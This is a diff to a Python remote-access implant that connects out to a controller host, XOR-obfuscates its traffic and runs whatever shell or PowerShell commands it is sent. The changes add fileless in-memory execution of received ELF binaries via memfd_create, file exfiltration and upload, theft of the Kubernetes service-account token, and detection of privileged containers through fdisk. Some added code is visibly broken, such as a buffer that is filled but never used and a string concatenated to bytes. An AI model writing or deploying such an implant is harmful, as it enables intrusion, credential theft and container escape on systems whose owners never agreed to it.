@@ -1,14 +1,17 @@
-import os
+import os, base64
 import socket, boto3
 import sys
-import subprocess
+import base64
 import platform
 import requests
 import psutil
 import json
 from multiprocessing import Process
-import time
+import time, random, string
 from subprocess import PIPE, Popen
+
+
+
 
 
 
@@ -16,7 +19,43 @@ from subprocess import PIPE, Popen
 
 global stop_thread
 
+letters = string.ascii_lowercase
+
+MEM_INJ_KEY = ''.join(random.choice(letters) for i in range(20))
+
 particles = {}
+
+def str_xor(a, key):
+    cipherAscii = ""
+    keyLength = len(key)
+    for i in range(0, len(a)):
+        j = i % keyLength
+        xor = ord(a[i]) ^ ord(key[j])
+        cipherAscii = cipherAscii + chr(xor)
+    return cipherAscii
+
+def execAnonFile(args,wait_for_proc_terminate, c):
+    s = ""
+    for _ in range(7):
+        s += random.choice(string.ascii_lowercase)
+
+    fd = os.memfd_create(s,0)
+    if fd == -1:
+        return ("Error in creating fd")
+    else:
+        with open("/proc/self/fd/{}".format(fd),'wb') as f:
+            f.write(c)
+
+        child_pid = os.fork()
+        if child_pid == -1:
+            return ("Error executing the code")
+        elif child_pid == 0:
+            fname = "/proc/self/fd/{}".format(fd)
+            args.insert(0,fname)
+            os.execve(fname,args,dict(os.environ))
+        else:
+            if wait_for_proc_terminate:
+                os.waitpid(child_pid,0)
 
 def init_info(system):
     if system == 'Linux':
@@ -48,11 +87,35 @@ def init_info(system):
 
         if os.path.exists('/var/run/docker.sock'):
             docksock = True
-
         else:
             docksock = False
 
         check_env['DOCKSOCK'] = docksock
+
+        fdisk = os.popen('fdisk -l').read()
+        if not fdisk == "":
+            privileged = True
+            disks = []
+            alldisks = fdisk.split(" ")
+
+            for d in alldisks:
+                if "/dev/" in d:
+                    index = alldisks.index(d)
+                    d = d + " " + alldisks[index+1] + " " + alldisks[index+2]
+                    if not d in disks:
+                        disks.append(d.replace(":", ""))
+
+            check_env['DISKS'] = disks
+
+        else:
+            privileged = False
+
+        check_env['PRIVILEGED'] = privileged
+
+        if os.path.exists('/run/secrets/kubernetes.io/serviceaccount/token'):
+            kubetoken = open('/run/secrets/kubernetes.io/serviceaccount/token', 'r').read()
+            kubetoken.close()
+            check_env['KUBETOKEN'] = kubetoken
 
         hostname = platform.node()
         check_env['HOSTNAME'] = hostname
@@ -200,103 +263,181 @@ def meta_data():
 
     return metadata
 
+def download(s, filepath, key):
+    file = open(filepath, 'rb')
+    filebytes = file.read()
+    print("Filesize: {}".format(len(filebytes)))
+    filebytes_64 = base64.b32encode(filebytes)
+    filebytes_xor = str_xor(filebytes_64.decode(), key)
+
+    s.send("{}done".format(filebytes_xor).encode())
+    file.close()
+
+def upload(filepath, b64):
+    file = open(filepath, 'wb')
+    filebytes = base64.b32decode(b64)
+    file.write(filebytes)
+    file.close()
+
+def recvall(s):
+    data = b''
+    bufferlength = 1048576
+    while True:
+        a = s.recv(bufferlength)
+        if a.decode().strip()[-4:] == 'done':
+            data += a
+            return data[:-4]
+        else:
+            data += a
+
+
 def socket_create():
     global stop_thread
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((HOST, PORT))
 
-        system = platform.system()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((HOST, PORT))
 
-        if system == 'Linux' or system == 'Darwin':
-            user = "{}".format(os.environ.get('USER'))
+    system = platform.system()
 
-        elif system == 'Windows':
-            user = "{}\\{}".format(os.environ.get('USERDOMAIN'), os.environ.get('USERNAME'))
+    if system == 'Linux' or system == 'Darwin':
+        user = "{}".format(os.environ.get('USER'))
+        if user == None:
+            user = os.popen('whoami').read().replace("\n", "")
 
-        ip = ''
-        ips = []
-        ipss = []
-        if system == 'Linux':
-            hostname = os.environ.get('NAME')
-            ip = os.popen('ip a').read()
-            for x in ip.split("\n"):
-                if "inet" in x:
-                    if "127.0.0.1" in x or "::1" in x:
-                        continue
-                    else:
-                        ips.append(x.split(" ")[5])
-                        ips = ip.split("\n")
-                        for x in ips:
-                            if "IPv4 Address" in x:
-                                a = ips.index(x)
-                                ipss.append(x.split(":")[1] + "\t" + (ips[a + 1]).split(":")[1])
+    elif system == 'Windows':
+        user = "{}\\{}".format(os.environ.get('USERDOMAIN'), os.environ.get('USERNAME'))
+        if user == None:
+            user = os.popen('whoami').read().replace("\n", "")
 
-        elif system == 'Windows':
-            hostname = os.environ.get('COMPUTERNAME')
-            ip = os.popen('ipconfig').read()
-
-        info = {}
-        info['USER'] = user
-        info['SYSTEM'] = system
-        info['HOSTNAME'] = hostname
-        info['LAN_IP'] = ipss
-
-        dt = json.dumps(info)
-        s.send(dt.encode())
-
-        while True:
-            data = s.recv(2048)
-            if data.decode().strip() == 'quit' or data.decode().strip() == 'exit':
-                stop_thread = False
-                s.send('Ok'.encode())
-                s.close()
-                sys.exit()
-
-            elif len(data.decode()) == 0:
-                s.send(" ".encode())
-
-            elif data.decode().strip() == 'check_env':
-                check_env_data = init_info(system)
-                metadata = meta_data()
-                check_env_data['META-DATA'] = metadata
-                check_env_data_str = json.dumps(check_env_data)
-                s.send(check_env_data_str.encode())
-
-            elif data.decode() == "":
-                dt = ' '
-                s.send(dt.encode())
-
-            elif 'cd ' in data.decode():
-                os.chdir((data.decode())[1:])
-
-            elif (data.decode().strip()).split(" ")[0] == 'kill':
-                if len((data.decode().strip()).split(" ")) == 1:
-                    s.send("kill_error".encode())
+    ip = ''
+    ips = []
+    ipss = []
+    if system == 'Linux':
+        hostname = os.environ.get('NAME')
+        ip = os.popen('ip a').read()
+        for x in ip.split("\n"):
+            if "inet" in x:
+                if "127.0.0.1" in x or "::1" in x:
+                    continue
                 else:
-                    Popen("kill " + (data.decode().strip()).split(" ")[1], shell=True, stdout=PIPE, stderr=PIPE)
-                    s.send("killed_{}".format((data.decode().strip()).split(" ")[1]).encode())
+                    ips.append(x.split(" ")[5])
+                    ips = ip.split("\n")
+                    for x in ips:
+                        if "IPv4 Address" in x:
+                            a = ips.index(x)
+                            ipss.append(x.split(":")[1] + "\t" + (ips[a + 1]).split(":")[1])
 
-            elif data.decode() == ' ':
-                dt = ' '
-                s.send(dt.encode())
+    elif system == 'Windows':
+        hostname = os.environ.get('COMPUTERNAME')
+        ip = os.popen('ipconfig').read()
+
+    info = {}
+    info['USER'] = user
+    info['SYSTEM'] = system
+    info['HOSTNAME'] = hostname
+    info['LAN_IP'] = ipss
+
+    dt = json.dumps(info)
+
+    senddt = str_xor(dt, ENCKEY)
+    senddt += 'done'
+    s.send(senddt.encode())
+
+    while True:
+        thedata = recvall(s)
+        data = str_xor(thedata.decode(), ENCKEY).strip()
+
+        if data == 'quit' or data == 'exit':
+            stop_thread = False
+            senddt = str_xor('Ok', ENCKEY)
+            senddt += 'done'
+            s.send(senddt.encode())
+            s.close()
+            sys.exit()
+
+        elif len(data) == 0 or data == ' ' or data == '':
+            senddt = str_xor(" ", ENCKEY)
+            senddt += 'done'
+            s.send(senddt.encode())
+
+        elif data.split(" ")[0] == 'run_in_memory':
+            file_buffer = b''
+            while True:
+                b64data = s.recv(65534)
+                if b64data:
+                    file_buffer += b64data
+                else:
+                    break
+            elf_contents = base64.b32decode(b64data)
+            args = []
+            wait_for_proc_terminate = True
+
+            try:
+                execAnonFile(args, wait_for_proc_terminate, elf_contents)
+                senddt = str_xor("done", ENCKEY)
+                senddt += 'done'
+                s.send(senddt.encode())
+
+            except:
+                e = sys.exc_info()[1]
+                e += 'done'
+                s.send(str_xor(e, ENCKEY).encode())
+
+        elif data.split(" ")[0] == 'download':
+            data_json = json.loads(data.strip('download '))
+            filepath = data_json['filepath']
+
+            download(s, filepath, ENCKEY)
+
+        elif data.split(" ")[0] == 'upload':
+            data_json = json.loads(data.strip('upload '))
+            filepath = data_json['filepath']
+            b64 = (data_json['filedata']).encode()
+            upload(filepath, b64)
+
+        elif data == 'check_env':
+            check_env_data = init_info(system)
+            metadata = meta_data()
+            check_env_data['META-DATA'] = metadata
+            check_env_data_str = json.dumps(check_env_data)
+            senddt = str_xor(check_env_data_str, ENCKEY)
+            senddt += 'done'
+            s.send(senddt.encode())
+
+        elif 'cd ' in data:
+            os.chdir((data)[1:])
+
+        elif data.split(" ")[0] == 'kill':
+            if len(data.split(" ")) == 1:
+                senddt = str_xor('kill_errordone', ENCKEY)
+                senddt += 'done'
+                s.send(senddt.encode())
+
             else:
-                out = err = ""
-                if system == 'Windows':
-                    command = "powershell.exe " + data.decode()
-                    p = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
-                    out, err = p.communicate()
-                elif system == 'Linux' or system == 'Darwin':
-                    p = Popen(data.decode(), shell=True, stdout=PIPE, stderr=PIPE)
-                    out, err = p.communicate()
+                Popen("kill " + data.split(" ")[1], shell=True, stdout=PIPE, stderr=PIPE)
+                senddt = str_xor("killed_{}done".format(data.split(" ")[1]), ENCKEY).encode()
+                senddt += 'done'
+                s.send(senddt.encode())
 
-                if out.decode() == '':
-                    cout = err.decode()
-                else:
-                    cout = out.decode()
-                s.send(cout.encode())
-    except socket.error as e:
-        pass
+        else:
+            out = err = ""
+            if system == 'Windows':
+                command = "powershell.exe " + data
+                p = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
+                out, err = p.communicate()
+            elif system == 'Linux' or system == 'Darwin':
+                p = Popen(data, shell=True, stdout=PIPE, stderr=PIPE)
+                out, err = p.communicate()
+
+            if out.decode() == '':
+                cout = err.decode()
+            else:
+                cout = out.decode()
+            print(cout)
+            senddt = str_xor(cout, ENCKEY)
+            senddt += 'done'
+            s.send(senddt.encode())
+
 
 def threads():
     global stop_thread
@@ -315,6 +456,13 @@ def threads():
         thread.join()
 
 if isinstance(SECONDS, int):
-    threads()
+    try:
+        threads()
+    except socket.error:
+        threads()
 else:
-    socket_create()
+    try:
+        socket_create()
+    except socket.error:
+        exit()
+
